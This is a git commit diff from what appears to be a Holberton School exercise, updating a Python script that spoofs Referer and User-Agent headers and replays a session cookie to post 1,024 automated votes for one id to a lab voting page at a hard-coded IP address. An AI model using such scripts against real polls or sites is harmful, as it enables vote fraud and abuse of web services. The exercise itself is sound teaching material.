eb1c743de5550e72e85e55685624389aa68babfe
Robinson Montes <1574@holbertonschool.com>
2020-06-04 22:30:46 +0000

    fix errors in 0, 1, 2

--- level_2/level2.py
+++ level_2/level2.py
@@ -8,7 +8,7 @@ Created on Thu May 28 07:10:33 2020
 import requests
 
 
-header = {'Referer': 'http://54.221.6.249/level2.php',
+header = {'Referer': 'http://158.69.76.135/level2.php',
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)\
                         AppleWebKit/537.36 (KHTML, like Gecko)\
                         Chrome/55.0.2883.87\
@@ -16,11 +16,11 @@ header = {'Referer': 'http://54.221.6.249/level2.php',
 
 cookies = {'HoldTheDoor': '0'}
 
-url = 'http://158.69.76.135/level1.php'
-playload = {'id': '1', 'holdthedoor': 'submit', 'key': '0'}
+url = 'http://158.69.76.135/level2.php'
+playload = {'id': '1574', 'holdthedoor': 'submit', 'key': '0'}
 
 req = requests.get(url)
-for i in range(4096):
+for i in range(1024):
     cookies['holdthedoor'] = req.cookies['HoldTheDoor']
-    req = requests.post(url, data=playload, cookies=cookies)
-print('Well done, Voting complete for level 1')
+    req = requests.post(url, data=playload, cookies=cookies, headers=header)
+print('Well done, Voting complete for level 2')
